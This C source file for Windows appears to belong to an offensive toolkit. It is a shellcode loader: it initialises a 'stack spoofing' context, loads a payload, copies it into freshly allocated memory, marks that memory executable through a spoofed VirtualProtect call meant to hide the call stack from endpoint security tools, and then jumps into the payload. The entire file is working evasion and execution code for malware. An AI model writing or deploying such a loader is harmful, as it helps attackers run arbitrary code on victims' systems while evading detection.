#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "../common.h"
#include "stackSpoofing.h"

int main(int argc, char* argv[]) {
    SpoofContext ctx = {0};

    printf("[*] Stack Spoofing Context Initialized\n");
    if (!InitSpoofContext(&ctx)) {
        PrintError("Failed to initialize spoof context");
        return 1;
    }
    PrintSuccess("Stack Spoofing Context Initialized");

    BYTE* payload = NULL;
    DWORD payloadSize = 0;
    if (!LoadPayload(&payload, &payloadSize)) return 1;

    printf("\n[*] Allocating memory (RW -> RX with spoofing)\n");
    printf("AllocateAndCopyPayload\n");

    LPVOID execMem = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) { PrintError("VirtualAlloc failed"); return 1; }

    memcpy(execMem, payload, payloadSize);
    free(payload);

    printf("[*] VirtualProtect with Stack Spoofing\n");
    DWORD oldProtect = 0;
    SpoofedVirtualProtect(&ctx, execMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);
    printf("[+] VirtualProtect succeeded, old protect: 0x%lx\n", oldProtect);
    printf("[+] Payload at: %p\n", execMem);

    printf("[*] Executing in Main Thread\n");
    printf("[+] Executing payload in main thread at: %p\n", execMem);
    ((void(*)())execMem)();

    WaitForSingleObject(GetCurrentThread(), INFINITE);
    return 0;
}
